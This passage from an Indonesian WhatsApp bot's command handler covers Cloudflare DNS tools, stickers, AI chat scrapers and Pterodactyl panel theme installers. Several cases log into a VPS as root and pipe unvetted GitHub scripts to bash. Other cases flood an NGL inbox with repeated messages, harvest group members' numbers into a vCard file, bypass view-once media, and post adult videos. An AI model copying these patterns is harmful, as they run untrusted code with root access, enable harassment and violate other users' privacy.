                console.error(`❌ Terjadi kesalahan saat menghapus record ${record.name}:`, error.message);
            }
        }

        await m.reply(`Berhasil menghapus ${totalDns} Subdomain ✅`);
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
    }
}

// Jalankan fungsi
return deleteAllDNSRecords();
}
break

case "listdomaincf": case "listdomcf": {
if (!isOwner) return m.reply(msg.owner)
const CLOUDFLARE_API_KEY = global.apitoken_cloudflare // Ganti dengan API Key atau API Token
const CLOUDFLARE_EMAIL = global.email_cloudflare // Email akun Cloudflare (jika pakai API Key)

async function getAllDomains() {
    let page = 1;
    let domains = [];
    let hasMore = true;

    while (hasMore) {
        const url = `https://api.cloudflare.com/client/v4/zones?page=${page}&per_page=50`; // Maksimal 50 per halaman

        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`, // Jika pakai API Token
                // 'X-Auth-Email': CLOUDFLARE_EMAIL, // Jika pakai API Key
                // 'X-Auth-Key': CLOUDFLARE_API_KEY  // Jika pakai API Key
            }
        });

        const data = await response.json();
        
        if (data.success) {
            domains = domains.concat(data.result.map(zone => ({
                id: zone.id,
                name: zone.name,
                status: zone.status
            })));

            // Cek apakah masih ada halaman berikutnya
            hasMore = data.result_info.page < data.result_info.total_pages;
            page++;
        } else {
            console.error('Gagal mengambil daftar domain:', data.errors);
            return [];
        }
    }

    console.log('Total Domain:', domains.length);
    console.log('Daftar Domain:', domains);
    return domains;
}


// Jalankan function
let res = await getAllDomains();
if (res.length < 1) return m.reply("Tidak ada domain di cloudflare")
let teks = `\n*Total Domain Cloudflare :* ${res.length}\n`
for (let i of res) {
teks += `
* ${i.name}
* *Status :* ${i.status == "active" ? i.status + " ✅" : i.status == "pending" ? i.status + " 🕞" : i.status + " ❌"}
`
}
return m.reply(teks)
}
break

case 'tourl': {
const FormData = require('form-data')
async function CatboxUpload(Path) {
    try {
        const form = new FormData();
        form.append("fileToUpload", fs.createReadStream(Path));
        form.append("reqtype", "fileupload");
        const res = await fetch("https://catbox.moe/user/api.php", {
            method: "POST",
            body: form,
        });
        const data = await res.text();
        return data;
    } catch (e) {
        console.error('Error:', e.message);
        throw e;
    }
}
try {
if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) reply(`*Kirim/Reply media dengan caption* ${prefix + command}`)
if (!quoted) reply(`*Kirim/Reply media dengan caption* ${prefix + command}`)
let media = await XPanz.downloadAndSaveMediaMessage(quoted)
let anu = await CatboxUpload(media)
let format = util.format(anu)
let cap = `🚩 Link Tautan : ${format}\n\nExpired : No Expired Date`
const interactiveButtons = [
     {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
             display_text: "Copy Link",
             id: "12345",
             copy_code: format
        })
     }
]
const interactiveMessage = {
    text: cap,
    title: "",
    footer: "© By Arroganzz Botz",
    interactiveButtons
}
await XPanz.sendMessage(m.chat, interactiveMessage, { quoted: m })
} catch (error) {
console.error(error)
m.reply(`Terjadi Kesalahan`)
}
}
break

case 'telegram': case 'tele': case 'telestalk': {
 if (!q) return m.reply(`Masukkan usernamenya!\nContoh: ${prefix + command} BiyuOffc`)
 try {
 const res = await fetch(`https://www.velyn.biz.id/api/stalk/telegramstalk?username=${q}`)
 const json = await res.json()
 if (!json.status) return m.reply('Username tidak ditemukan!')
 const { title, description, url, image_url } = json.data
 const teks = `*Telegram Info*\n\n*Nama:* ${title}\n*Bio:* ${description}\n*Link:* ${url}`
 XPanz.sendMessage(m.chat, {
 image: { url: image_url },
 caption: teks
 }, { quoted: m })
 } catch {
 m.reply('Gagal mengambil data.')
 }
}
 break

case 'delcase': {
 if (!isCreator) return m.reply(mess.owner)
 if (!text) return m.reply('Masukkan nama case yang ingin dihapus')
 const fs = require('fs')
 const namaFile = 'Skyzopedia.js'
 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('Terjadi kesalahan saat membaca file:', err)
 return m.reply('Gagal membaca file')
 }
 const casePattern = new RegExp(`case ['"]${text}['"]:[\\s\\S]*?break`, 'g')
 if (!casePattern.test(data)) {
 return m.reply(`Case '${text}' tidak ditemukan`)
 }
 const newContent = data.replace(casePattern, '')
 fs.writeFile(namaFile, newContent, 'utf8', (err) => {
 if (err) {
 console.error('Terjadi kesalahan saat menulis file:', err)
 return m.reply('Gagal menghapus case')
 }
 m.reply(`Case '${text}' berhasil dihapus`)
 })
 })
}
break

case "resavekontak": {
if (!isOwner) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("idgrupnya"))
let res = await XPanz.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyyer XPanzZyy - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
ArroganzzReply(err.toString())
} finally {
if (m.chat !== m.sender) await ArroganzzReply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await XPanz.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

case "autoai": {
if (!isCreator) return ArroganzzReply(mess.owner)
    if (!text) return m.reply(`*Contoh:* .autoai *[on/off/reset]*`);

    if (text === "on") {
        globalAutoAIStatus = true;
        sessions = {}; 
        saveSession();
        return m.reply(`[ ✅ ] *Auto AI diaktifkan di semua chat!* Bot akan merespon otomatis di semua percakapan.`);
    } else if (text === "off") {
        globalAutoAIStatus = false;
        sessions = {}; 
        saveSession();
        return m.reply(`[ ❌ ] *Auto AI dimatikan di semua chat!* Bot hanya merespon jika dipanggil.`);
    } else if (text === "reset") {
        if (globalAutoAIStatus) {
            sessions = {};
            saveSession();
            return m.reply("♻️ *Seluruh riwayat chat AI telah direset!*");
        } else {
            return m.reply("⚠️ *Auto AI sedang tidak aktif!*");
        }
    }
}
break

case 'zerogpt':
  if (!q) return m.reply('Masukkan teks yang mau ditanyakan, contoh: .zerogpt apa itu air');
  try {
    const axios = require('axios');
    const id = () => Math.random().toString(36).slice(2, 18);
    const res = await axios.post('https://zerogptai.org/wp-json/mwai-ui/v1/chats/submit', {
      botId: "default",
      customId: null,
      session: "N/A",
      chatId: id(),
      contextId: 39,
      messages: [],
      newMessage: q,
      newFileId: null,
      stream: true
    }, {
      headers: {
        'Content-Type': 'application/json',
        'X-WP-Nonce': 'e7b64e1953',
        'Accept': 'text/event-stream'
      },
      responseType: 'stream'
    });
    let out = '';
    res.data.on('data', chunk => {
      chunk.toString().split('\n').forEach(line => {
        if (line.startsWith('data: ')) {
          const data = JSON.parse(line.slice(6));
          if (data.type === 'live') out += data.data;
          if (data.type === 'end') m.reply(out.trim());
        }
      });
    });
  } catch (e) {
    m.reply('Error: ' + e.message);
  }
  break
case 'gpt': {
    if (!text) return m.reply('Tanya Apa');
    const axios = require('axios');
    const cheerio = require('cheerio');
    const FormData = require('form-data');

    const generateRandomString = (length) => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    };

    const getNonce = async () => {
        try {
            const { data } = await axios.get("https://chatgpt4o.one/", {
                headers: {
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml",
                }
            });
            const $ = cheerio.load(data);
            return $("div.wpaicg-chat-shortcode").attr("data-nonce") || null;
        } catch (err) {
            console.error("Nonce Error:", err.message);
            return null;
        }
    };

    const sendChat = async (msg) => {
        try {
            const nonce = await getNonce();
            if (!nonce) throw new Error("Nonce not found");

            const clientId = generateRandomString(10);
            const formData = new FormData();
            formData.append("_wpnonce", nonce);
            formData.append("post_id", 11);
            formData.append("url", "https://chatgpt4o.one/");
            formData.append("action", "wpaicg_chat_shortcode_message");
            formData.append("message", msg);
            formData.append("bot_id", 0);
            formData.append("chatbot_identity", "shortcode");
            formData.append("wpaicg_chat_history", JSON.stringify([]));
            formData.append("wpaicg_chat_client_id", clientId);

            const { data } = await axios.post(
                "https://chatgpt4o.one/wp-admin/admin-ajax.php",
                formData,
                {
                    headers: {
                        ...formData.getHeaders(),
                        "User-Agent": "Mozilla/5.0",
                        "Accept": "application/json",
                        "X-Requested-With": "XMLHttpRequest"
                    }
                }
            );
            return data;
        } catch (err) {
            console.error("Chat Error:", err.message);
            return null;
        }
    };

    const res = await sendChat(text);
    if (!res) return m.reply('Gagal Dapat Responnya');
    m.reply(res.data || res.message || 'Gak Ada Respon');
}
break

case "installtema": case "installthema": {
 if (!text) return m.reply(`Contoh : ${prefix + command} ipvps|pwvps`);
 const safeText = typeof text === 'string' ? text : String(text || '');
 if (safeText.length > 100) return m.reply(`Karakter terbatas, max 100!`);
 try {
 const messageText = `Yuk pilih *thema* yang ingin kamu install! Klik tombol di bawah ini.`;
 await XPanz.sendMessage(m.chat, {
 image: { url: XPanzimg },
 caption: messageText,
 footer: 'Install Thema 😌',
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: '🎨 Pilih Thema' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Thema Pterodactyl',
 sections: [
 {
 title: '🔥 Thema Premium',
 rows: [
{ title: 'Tema Enigma', description: 'Ciptakan tampilan elegan dan misterius dengan Tema Enigma.', id: `${prefix}installtemaenigma ${safeText}` },
{ title: 'Tema Nook', description: 'Tampilan bersih dan modern untuk panel kamu dengan Tema Nook.', id: `${prefix}installtemanook ${safeText}` },
{ title: 'Tema Nightcore', description: 'Desain modern nan bersih, cocok untuk kamu yang suka nuansa gelap elegan.', id: `${prefix}installtemanightcore ${safeText}` },
{ title: 'Tema Elysium', description: 'Desain stylish dan premium hadir lewat Tema Elysium.', id: `${prefix}installtemaelysium ${safeText}` },
{ title: 'Tema Nebula', description: 'UI futuristik dan modern yang menawan dari Tema Nebula.', id: `${prefix}installtemanebula ${safeText}` },
{ title: 'Tema Stellar', description: 'Minimalis dan smooth — itulah Tema Stellar.', id: `${prefix}installtemastellar ${safeText}` },
{ title: 'Tema Billing', description: 'Tampilan rapi khusus untuk halaman billing kamu.', id: `${prefix}installtemabilling ${safeText}` }
 ]
 },
 {
 title: '💡 Lainnya',
 rows: [
 { title: 'Install Depend (Thema Nebula)', description: 'Wajib sebelum install Thema Nebula.', id: `${prefix}installdepend ${safeText}` }
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 4,
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender],
 externalAdReply: {
 title: global.botname,
 thumbnailUrl: XPanzimg,
 sourceUrl: "",
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m });
 } catch (error) {
 console.error('Error di case installtema:', error);
 m.reply('Terjadi kesalahan saat memproses perintah. Silakan coba lagi.');
 }
}
break

case "installtemanook":
case "temanook":
case "nooktheme": {
  if (!text || !text.includes('|')) {
    return m.reply("⚠️ Format salah!\n\nGunakan format:\n.temanook ip|password\n\nContoh:\n.nooktheme 192.168.1.10|mypassword");
  }
  const [ip, password] = text.split('|').map(v => v.trim());
  if (!ip || !password) return m.reply("❌ IP atau password tidak boleh kosong.");
  const { Client } = await import('ssh2');
  let ssh = new Client();
  m.reply('🔧 Menghubungkan ke VPS dan mulai instalasi tema Nook...');
  ssh.on('ready', () => {
    m.reply('✅ Terhubung ke VPS!\n▶️ Memulai proses instalasi Nook Theme...');
    ssh.exec(`bash -c "
set -e
cd /var/www/pterodactyl
php artisan down
curl -L https://github.com/Nookure/NookTheme/releases/latest/download/panel.tar.gz | tar -xzv
chmod -R 755 storage/* bootstrap/cache
command -v composer >/dev/null 2>&1 || { curl -sS https://getcomposer.org/installer | php && mv composer.phar /usr/local/bin/composer; }
composer install --no-dev --optimize-autoloader --no-interaction
php artisan view:clear
php artisan config:clear
php artisan migrate --seed --force
chown -R www-data:www-data /var/www/pterodactyl/*
php artisan queue:restart
php artisan up
"`, async (err, stream) => {
      if (err) {
        m.reply("❌ Gagal mengeksekusi perintah di VPS.");
        return ssh.end();
      }
      stream.on('data', (data) => {
        console.log(`[VPS stdout]: ${data.toString()}`);
      });
      stream.stderr.on('data', (data) => {
        console.error(`[VPS stderr]: ${data.toString()}`);
      });
      stream.on('close', async () => {
        await XPanz.sendMessage(m.chat, {
          text: '✅ *Nook Theme berhasil diinstal!*\nServer kembali online.',
          footer: `© Arroganzz Botz`,
          quoted: m
        });
        ssh.end();
      });
    });
  }).on('error', (err) => {
    m.reply(`❌ Gagal konek ke VPS:\n${err.message}`);
  }).connect({
    host: ip,
    port: 22,
    username: 'root',
    password: password
  });
}
break

case "installdepend": {
if (!isCreator) return m.reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
await m.reply("Berhasil install Depend silakan ketik .installtemanebula ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('11\n');
stream.write('A\n');
stream.write('Y\n');
stream.write('Y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "temaelysium": case "installtemaelysium": {
    if (!isOwner) return m.reply(mess.owner);
    if (!text || text.split("|").length < 2) return m.reply(example("ipvps|pwvps"));
    let [ipvps, passwd] = text.split("|");
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`;
    const ress = new Client();
    ress.on('ready', async () => {
        m.reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selesai");
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                await m.reply("Berhasil install *tema Elysium* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('1\n');
                stream.write('y\n');
                stream.write('yes\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

case "temanightcore": case "installtemanightcore": {
    if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply("username@ipvps|pwvps");
    let vii = text.split("|");
    if (vii.length < 2) return m.reply("username@ipvps|pwvps");
    let ipInput = vii[0];
    let passwd = vii[1];
    let uservps = "root"; 
    let ipvps = ipInput;
    if (ipInput.includes("@")) { 
        let splitIP = ipInput.split("@");
        uservps = splitIP[0]; 
        ipvps = splitIP[1];
    }
    const biyuSettings = {
        host: ipvps,
        port: '22',
        username: uservps,
        password: passwd
    };
    const command = `bash <(curl -s https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`;
    const ress = new Client();
    ress.on('ready', async () => {
        m.reply(`🔹 *Memproses install tema Nightcore*\nTunggu 1-10 menit...\n\n🖥️ VPS: ${ipvps}\n👤 User: ${uservps}`);
        ress.exec(command, (err, stream) => {
            if (err) throw err;

            stream.on('close', async (code, signal) => {    
                await m.reply("✅ *Tema Nightcore berhasil diinstall!*");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('1\n');
                stream.write('y\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR:', data.toString());
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error:', err);
        m.reply('❌ *Gagal terhubung!* Kata sandi, username, atau IP tidak valid.');
    }).connect(biyuSettings);
}
break

case "listprem": {
if (!isOwner) return m.reply(mess.owner)
if (premium.length < 1) return m.reply("𝘕𝘰 𝘏𝘢𝘷𝘦 𝘜𝘴𝘦𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 :(")
let teks = `\n𝘓𝘪𝘴𝘵 𝘈𝘭𝘭 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
XPanz.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓
case "addprem": {
if (!isOwner) return m.reply(mess.owner)
if (!text && !m.quoted) return m.reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`𝘕𝘰𝘮𝘰𝘳 ${input2} 𝘴𝘶𝘥𝘢𝘩 𝘔𝘦𝘯𝘫𝘢𝘥𝘪 𝘙𝘦𝘴𝘦𝘭𝘭𝘦𝘳!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
}
break
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓🥺
case "delprem": {
    if (!isOwner) return m.reply(mess.owner)
if (!m.quoted && !text) return m.reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Delete success`)
if (!premium.includes(input)) return m.reply(`Nomer ${input2} Bukan User Premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘛𝘰 𝘋𝘦𝘭𝘦𝘵𝘦 𝘗𝘳𝘦𝘮𝘪𝘶𝘮`)
}
break

case "hentaivid": case "hv": {
                 m.reply(mess.wait);
                  const anu = `https://api.agatz.xyz/api/hentaivid`; 
                  try { 
                  const res = await fetch(anu); 
                  const response = await res.json();
if (!response.data || response.data.length === 0) {
        return m.reply("Hasil tidak ditemukan");
    }
    
    for (let i = 0; i < Math.min(response.data.length, 10); i++) {
        const video = response.data[i];
        await XPanz.sendMessage(m.chat, {
            video: { url: video.video_1 },
            mimeType: 'video/mp4',
            caption: `Title: ${video.title}`
        }, { quoted: m });
    }
} catch (e) {
    console.log(e);
    await m.reply("Terjadi kesalahan dalam mengambil data.");
}
}
 break

case 'sendngl': {
 if (!text.includes('|')) return m.reply('Format salah!\nContoh: .sendngl link | pesan | jumlah');
 let [link, pesan, jumlah] = text.split('|').map(v => v.trim());
 jumlah = parseInt(jumlah);
 if (!link.startsWith('https://ngl.link/')) return m.reply('Link NGL tidak valid!');
 if (!pesan) return m.reply('Pesan tidak boleh kosong!');
 if (isNaN(jumlah) || jumlah < 1) return m.reply('Jumlah harus angka lebih dari 0!');
 let username = link.split('https://ngl.link/')[1];
 if (!username) return m.reply('Username NGL tidak ditemukan di link!');
 const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 const abiyu = ms => new Promise(resolve => setTimeout(resolve, ms));
 m.reply(`Mengirim pesan ke NGL @${username} sebanyak ${jumlah} kali...`);
 for (let i = 0; i < jumlah; i++) {
 try {
 await fetch('https://ngl.link/api/submit', {
 method: 'POST',
 headers: {
 'accept': '*/*',
 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
 },
 body: `username=${username}&question=${encodeURIComponent(pesan)}&deviceId=1`
 });
 await abiyu(1000); 
 } catch (err) {
 console.log('Nyocot Erorr:', err);
 }
 }
 m.reply(`Selesai mengirim ${jumlah} pesan ke @${username}!\n\nGunakan Dengan Bijak\n`);
}
break
case 'addcase': {
  if (!isCreator) return ArroganzzReply(mess.owner);
  if (!text && !m.quoted) return ArroganzzReply(`ArroganzzReply pesan atau gunakan format: ${prefix + command} case:{ ... break}`)
let caseBaru = m.quoted && m.quoted.text ? m.quoted.text : text
const startIndex = caseBaru.indexOf("case")
    const endIndex = caseBaru.lastIndexOf("break")
    if (startIndex === -1 || endIndex === -1) {
        return ArroganzzReply("Teks harus mengandung kata 'case' dan diakhiri dengan 'break'")
    }
    caseBaru = caseBaru.slice(startIndex, endIndex + 5); // +5 untuk menyertakan kata 'break'
    fs.readFile('Skyzopedia.js', 'utf8', (err, data) => {
        if (err) {
            console.error('Error saat membaca file:', err);
            return ArroganzzReply('Terjadi kesalahan saat membaca file')
        }
     const posisiAwalGimage = data.indexOf("case 'addcase':")
        if (posisiAwalGimage !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage)
            fs.writeFile("Skyzopedia.js", kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Error saat menulis file:', err)
                    return ArroganzzReply('Terjadi kesalahan saat menambahkan case baru')
                } else {
                    return ArroganzzReply('Case baru berhasil di tambahkan')
                }
            });
        } else {
            return ArroganzzReply('Posisi untuk menambahkan case tidak ditemukan')
        }
    })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'brat':
if (!text) return ArroganzzReply(`Example: .brat Aku Anak Sigma 🤫🧏`);
try {
let caption = `Silahkan pilih tipe yang diinginkan:\n\n1. *Gambar 🖼️*\n2. *Video 🎥*`;
XPanz.sendMessage(m.chat, {
text: caption,
footer: `© Arroganzz - Botz`,
buttons: [
{
buttonId: `.bratimg ${text}`,
buttonText: { displayText: "Gambar 🖼️" }
},
{
buttonId: `.bratvid ${text}`,
buttonText: { displayText: "Video 🎥" }
}
],
viewOnce: true,
}, { quoted: m });
} catch (err) {
console.error(err);
ArroganzzReply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
}
break

case "bratimg": {
if (!text) return ArroganzzReply(example('teksnya'))
let brat = `https://restapi-v2.simplebot.my.id/imagecreator/brat?text=${text}`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await XPanz.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {

}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "emojimix": {
if (!text) return ArroganzzReply(example('😀|😍'))
if (!text.split("|")) return ArroganzzReply(example('😀|😍'))
let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await XPanz.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "bratvid":
case "bratvideo": {
  if (!text) return m.reply(example('teksnya'));
  try {
    const axios = require('axios');
    const { tmpdir } = require('os');
    const { join } = require('path');
    const fs = require('fs');
    const { spawn } = require('child_process');
    const videoUrl = `https://fastrestapis.fasturl.cloud/maker/brat/animated?text=${encodeURIComponent(text)}&mode=animated`;
    const res = await axios.get(videoUrl, { responseType: 'arraybuffer' });
    const tmpMp4 = join(tmpdir(), `brat-${Date.now()}.mp4`);
    const tmpWebp = join(tmpdir(), `brat-${Date.now()}.webp`);
    fs.writeFileSync(tmpMp4, res.data);
    await new Promise((resolve, reject) => {
      const ffmpeg = spawn('ffmpeg', [
        '-i', tmpMp4,
        '-vf', 'scale=512:512:force_original_aspect_ratio=decrease,fps=15',
        '-loop', '0',
        '-ss', '0',
        '-t', '6',
        '-an',
        '-vsync', '0',
        '-s', '512x512',
        '-f', 'webp',
        tmpWebp
      ]);
      ffmpeg.on('close', (code) => {
        if (code === 0) resolve();
        else reject(new Error('FFmpeg failed with code ' + code));
      });
    });
    const stickerBuffer = fs.readFileSync(tmpWebp);
    await conn.sendMessage(m.chat, {
      sticker: stickerBuffer,
      packname: global.packname,
      author: global.author,
    }, { quoted: m });
    fs.unlinkSync(tmpMp4);
    fs.unlinkSync(tmpWebp);
  } catch (err) {
    console.error("Error:", err);
    m.reply('Gagal bikin sticker animasi. Coba lagi nanti.');
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "emojigif": {
if (!text) return ArroganzzReply(example('😍'))
try {
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await XPanz.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "qc": {
if (!text) return ArroganzzReply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await XPanz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return ArroganzzReply("Error")
await XPanz.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return ArroganzzReply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return ArroganzzReply("Durasi vidio maksimal 15 detik!")
var image = await XPanz.downloadAndSaveMediaMessage(qmsg)
await XPanz.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return ArroganzzReply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return ArroganzzReply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return ArroganzzReply("Durasi vidio maksimal 15 detik!")
var image = await XPanz.downloadAndSaveMediaMessage(qmsg)
await XPanz.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "rvo": case "readviewonce": {
if (!m.quoted) return ArroganzzReply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return ArroganzzReply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return XPanz.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return XPanz.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return XPanz.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "readqr": {
if (!/image|video/.test(mime)) return ArroganzzReply(example("dengan reply qris"))
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
            };
            qr.decode(image.bitmap);
        } catch (error) {
            reject(error);
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
